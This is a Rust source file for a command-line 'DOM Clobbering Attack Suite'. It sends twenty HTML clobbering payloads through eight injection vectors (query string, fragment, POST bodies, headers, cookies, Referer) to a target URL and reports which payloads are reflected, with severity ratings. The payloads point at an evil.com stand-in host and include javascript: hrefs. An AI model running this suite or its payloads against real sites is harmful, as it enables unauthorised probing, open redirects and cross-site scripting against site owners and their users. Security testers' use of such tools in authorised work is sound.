use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const CLOBBER_PAYLOADS: &[(&str, &str)] = &[
    ("HTML img id override", r#"<img id="config" src="x">"#),
    (
        "HTML form id override",
        r#"<form id="config"><input name="endpoint" value="https://evil.com"></form>"#,
    ),
    (
        "HTML a id override",
        r#"<a id="config" href="https://evil.com">"#,
    ),
    (
        "HTML a name override",
        r#"<a name="redirectUrl" href="https://evil.com">"#,
    ),
    (
        "HTML img name+src",
        r#"<img name="config" src="https://evil.com/x">"#,
    ),
    (
        "HTML embed override",
        r#"<embed id="trustedEndpoint" src="https://evil.com">"#,
    ),
    (
        "HTML object override",
        r#"<object id="config" data="https://evil.com">"#,
    ),
    ("HTML input override", r#"<input id="debug" value="true">"#),
    (
        "HTML select override",
        r#"<select id="role"><option value="admin">admin</option></select>"#,
    ),
    (
        "HTML textarea override",
        r#"<textarea id="config">{"apiUrl":"https://evil.com"}</textarea>"#,
    ),
    (
        "Multiple element clobber",
        r#"<img id="a" name="b"><form id="c"><input name="d">"#,
    ),
    (
        "HTMLCollection clobber",
        r#"<img id="elements"><img name="elements">"#,
    ),
    (
        "window.location clobber",
        r#"<a id="location" href="https://evil.com">"#,
    ),
    (
        "document.domain clobber",
        r#"<a id="domain" href="evil.com">"#,
    ),
    (
        "toString override",
        r#"<a id="toString" href="javascript:alert(1)">"#,
    ),
    (
        "constructor clobber",
        r#"<form id="constructor"><input name="prototype" value="polluted">"#,
    ),
    (
        "Symbol.toPrimitive",
        r#"<a id="Symbol.toPrimitive" href="x">"#,
    ),
    (
        "hasOwnProperty clobber",
        r#"<a id="hasOwnProperty" href="javascript:alert(1)">"#,
    ),
    ("window.name clobber", r#"<a id="name" href="evil">"#),
    (
        "Array clobber",
        r#"<form id="Array"><input name="length" value="0">"#,
    ),
];

const CLOBBER_INJECTION_VECTORS: &[(&str, &str)] = &[
    ("URL parameter", "?html=<img id=\"config\" src=\"x\">"),
    ("URL fragment", "#<img id=\"config\" src=\"x\">"),
    (
        "POST body (JSON)",
        r#"{"html":"<img id=\"config\" src=\"x\">"}"#,
    ),
    ("POST body (form)", "html=<img id=\"config\" src=\"x\">"),
    (
        "Header injection",
        "X-Custom-HTML: <img id=\"config\" src=\"x\">",
    ),
    ("Cookie injection", "html=<img id=\"config\" src=\"x\">"),
    ("Referer injection", "https://evil.com/?<img id=\"config\">"),
    (
        "SVG embed",
        "?svg=<svg><image id=\"config\" href=\"https://evil.com\">",
    ),
];

pub async fn clobber(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} DOM Clobbering Attack Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!(
        "{} {} payloads, {} injection vectors",
        "[*]".cyan().bold(),
        CLOBBER_PAYLOADS.len(),
        CLOBBER_INJECTION_VECTORS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    println!(
        "\n{} Testing DOM clobbering payloads via injection vectors...",
        "[*]".cyan().bold()
    );
    let mut results = Vec::new();

    for (vec_name, vec_payload) in CLOBBER_INJECTION_VECTORS {
        let test_url = if vec_name.starts_with("URL") || vec_name.starts_with("SVG") {
            format!("{}{}", url, vec_payload)
        } else {
            url.to_string()
        };

        for (payload_name, payload) in CLOBBER_PAYLOADS {
            let req = if vec_name.contains("POST body (JSON)") {
                client
                    .post(&test_url)
                    .header("Content-Type", "application/json")
                    .body(serde_json::json!({"html": payload}).to_string())
            } else if vec_name.contains("POST body (form)") {
                client
                    .post(&test_url)
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .body(format!("html={}", urlencoding_encode(payload)))
            } else if vec_name.contains("Header") {
                client.get(&test_url).header("X-Custom-HTML", *payload)
            } else if vec_name.contains("Cookie") {
                client
                    .get(&test_url)
                    .header("Cookie", format!("html={}", urlencoding_encode(payload)))
            } else if vec_name.contains("Referer") {
                client
                    .get(&test_url)
                    .header("Referer", format!("https://evil.com/?{}", payload))
            } else {
                client.get(&test_url)
            };

            match req.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let body = resp.text().await.unwrap_or_default();
                    let reflected = body.contains(payload)
                        || body.contains("id=\"config\"")
                        || body.contains("id='config'");
                    let tag = if reflected {
                        "REFLECTED".red().bold().to_string()
                    } else if status == 200 {
                        "ok".dimmed().to_string()
                    } else {
                        format!("status {}", status)
                    };
                    if reflected {
                        println!(
                            "  {} [{:02}] {:20} + {:25} status={} {}",
                            "*".cyan(),
                            results.len() + 1,
                            vec_name,
                            payload_name,
                            status,
                            tag
                        );
                        results.push((vec_name, payload_name, payload.to_string()));
                    }
                }
                Err(_) => {}
            }
        }
    }

    println!(
        "\n{} {} / {} payloads reflected in DOM",
        "[*]".cyan().bold(),
        results.len(),
        CLOBBER_PAYLOADS.len() * CLOBBER_INJECTION_VECTORS.len()
    );

    if !results.is_empty() {
        println!("{} Reflected DOM clobbering payloads:", "[!]".red().bold());
        for (vec, payload, html) in &results {
            println!("  {} {} via {}", "*".red(), payload, vec);
            println!(
                "    {} {}",
                ">".red().bold(),
                html.chars().take(100).collect::<String>()
            );
        }

        let has_config = results.iter().any(|(_, _, h)| h.contains("config"));
        let has_location = results.iter().any(|(_, _, h)| h.contains("location"));
        let has_constructor = results.iter().any(|(_, _, h)| h.contains("constructor"));
        let has_to_string = results.iter().any(|(_, _, h)| h.contains("toString"));

        if has_config {
            println!(
                "\n{} [HIGH] Can clobber config objects — potential XSS or data exfiltration",
                "[!]".red().bold()
            );
        }
        if has_location {
            println!(
                "{} [CRITICAL] Can clobber window.location — open redirect / XSS!",
                "[!]".red().bold()
            );
        }
        if has_constructor {
            println!(
                "{} [HIGH] Can clobber constructor — prototype pollution chain!",
                "[!]".red().bold()
            );
        }
        if has_to_string {
            println!(
                "{} [HIGH] Can clobber toString — type confusion attacks!",
                "[!]".red().bold()
            );
        }
    } else {
        println!(
            "{} No DOM clobbering payloads reflected.",
            "[-]".green().bold()
        );
    }

    Ok(())
}

fn urlencoding_encode(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
                c.to_string()
            } else {
                format!("%{:02X}", c as u8)
            }
        })
        .collect()
}
